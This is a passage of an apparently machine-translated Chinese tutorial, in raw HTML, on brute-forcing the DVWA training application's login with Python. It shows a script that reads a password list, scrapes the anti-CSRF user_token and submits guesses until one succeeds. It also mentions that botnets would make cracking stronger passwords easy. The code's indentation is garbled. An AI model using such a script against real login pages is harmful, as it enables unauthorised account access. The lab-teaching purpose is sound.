translated">这没什么大不了的，所以我们可以通过改变一行代码来改变main函数，使之尽可能容易地在三个级别之间切换。</p><p id="953d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们可以用if语句获得结果，该语句检查安全级别是否设置为高。</p><p id="287f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是我们新的主要功能:</p><pre class="mz na nb nc gt nd ne nf ng aw nh bi"><span id="0f39" class="ni lw it ne b gy nj nk l nl nm">if __name__=="__main__":<br/>    BASE_URL = "<a class="ae ld" href="http://10.10.36.246" rel="noopener ugc nofollow" target="_blank">http://10.10.36.246</a>"<br/>    bruteforce_url = f"{BASE_URL}/vulnerabilities/brute?"<br/>    filename = sys.argv[1]<br/>    username = "admin"</span><span id="4754" class="ni lw it ne b gy nn nk l nl nm">    q = get_passwords(filename)</span><span id="a442" class="ni lw it ne b gy nn nk l nl nm">    with DVWASessionProxy(BASE_URL) as s:<br/>        s.security = SecurityLevel.HIGH<br/>        for password in q:<br/>                      <br/>            data = {<br/>            "username": username,<br/>            "password": password,<br/>            "Login": "Login"<br/>            }</span><span id="e26e" class="ni lw it ne b gy nn nk l nl nm">    if s.security is SecurityLevel.HIGH.value:</span><span id="061f" class="ni lw it ne b gy nn nk l nl nm">    response = s.get(bruteforce_url)<br/>                soup = BeautifulSoup(response.text, 'html.parser')<br/>                user_token = soup.find("input", {"name":    "user_token"})["value"]<br/>                data["user_token"] = user_token<br/>            response = send_credentials(s, bruteforce_url, data)<br/>            print(" "*40, end="\r")<br/>            print(f"[!] Testing: {password}", end="\r")<br/>            if "password incorrect." not in response.text:<br/>                print("")<br/>                print(f"[+] Found: {password}")<br/>                break</span></pre><p id="86ec" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通过运行，甚至这个级别是完整的！祝贺你，祝你成功！</p><figure class="mz na nb nc gt ju gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/000c5d29dafb1d30ccfafbe34935f23b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1090/format:webp/1*PjDqdKJAIF9QWm-A4KSQ0g.jpeg"/></div></figure><h1 id="6672" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">第4步:代码概述</h1><p id="7bab" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">像往常一样，为了让您更好地了解整个过程，这是完整的代码(我还包括了utils库):</p><figure class="mz na nb nc gt ju"><div class="bz fp l di"><div class="nv nw l"/></div></figure><h1 id="e693" class="lv lw it bd lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms bi translated">结论</h1><p id="9706" class="pw-post-body-paragraph ke kf it kh b ki mt kk kl km mu ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">我希望您意识到用python发起暴力攻击是多么容易，即使DVWA只是一台测试机器。</p><p id="266e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">然而，本文的主要目标是让您了解如何使用python脚本执行暴力攻击，以及使用安全密码的重要性。</p><p id="d0a2" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">正如您所看到的，一台机器可能不具备在现实世界中破解安全密码的处理能力。<br/>但是，如果我们有更多的机器，比如僵尸网络，就很容易破解比<em class="kg">“密码”</em>更安全的密码，就像我们在本教程中看到的那样。</p><p id="6659" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我希望一切都解释清楚了，如果不放心，随时与我联系。</p><p id="3b46" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果你喜欢我的作品，我邀请你关注我的博客和我所有的社交活动。</p><p id="5de0" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">非常感谢，下一篇文章再见！</p></div><div class="ab cl nx ny hx nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="im in io ip iq"><p id="c276" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">你可以通过下面的链接注册，每月只需5美元就可以获得所有的媒体报道:</em></p><div class="oe of gp gr og oh"><a href="https://medium.com/membership/@stackzero" rel="noopener follow" target="_blank"><div class="oi ab fo"><div class="oj ab ok cl cj ol"><h2 class="bd iu gy z fp om fr fs on fu fw is bi translated">用我的推荐链接加入媒体- StackZero</h2><div class="oo l"><h3 class="bd b gy z fp om fr fs on fu fw dk translated">我们的最新报道(以及数以千计的其他报道)一经发布，您就可以立即获得。成为会员后，您将获得所有权限…</h3></div><div class="op l"><p class="bd b dl z fp om fr fs on fu fw dk translated">medium.com</p></div></div><div class="oq l"><div class="or l os ot ou oq ov jz oh"/></div></div></a></div></div><div class="ab cl nx ny hx nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="im in io ip iq"><p id="f9f3" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">原载于2022年11月3日https://www.stackzero.net</em><em class="kg">的</em> <a class="ae ld" href="https://www.stackzero.net/brute-force-dvwa-python/" rel="noopener ugc nofollow" target="_blank"> <em class="kg">。</em></a></p></div><div class="ab cl nx ny hx nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="im in io ip iq"><h2 id="4205" class="ni lw it bd lx ow ox dn mb oy oz dp mf le pa pb mj lf pc pd mn lg pe pf mr pg bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ld" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4条线索、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>